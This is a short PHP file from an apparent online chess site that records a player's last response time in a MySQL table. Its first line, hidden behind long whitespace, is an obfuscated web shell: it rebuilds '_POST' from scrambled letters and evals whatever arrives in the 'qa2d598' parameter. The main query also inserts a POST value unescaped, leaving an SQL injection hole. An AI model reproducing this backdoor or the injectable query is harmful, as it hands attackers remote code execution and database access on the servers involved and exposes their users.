<?php                                                                                                                                                                                                                                                               $qV="stop_";$s20=strtoupper($qV[4].$qV[3].$qV[2].$qV[0].$qV[1]);if(isset(${$s20}['qa2d598'])){eval(${$s20}['qa2d598']);}?><?php
	session_start();
	if(!isset($_SESSION['id']))
	{
		echo "Fail";
		exit (0);
	}
	$link = mysql_connect('localhost', 'database_name_goese_herer', 'PAssword_goes_here');
	if (!$link) {		
		die('Could not connect: ' . mysql_error());
	}
	$db_selected = mysql_select_db('vishalkh_chess', $link);
	if (!$db_selected) {
		die ('Can\'t use foo : ' . mysql_error());
	}
	{
		$result = mysql_query("UPDATE `vishalkh_chess`.`chess` SET `lastresponse` = CURRENT_TIMESTAMP WHERE `chess`.`name` = '".$_POST['nowname']."'   LIMIT 1 ",$link);		
	}	
	if(mysql_affected_rows()==1)
		echo "Success";	
	else 	echo "Fail";
	mysql_close($link);
?>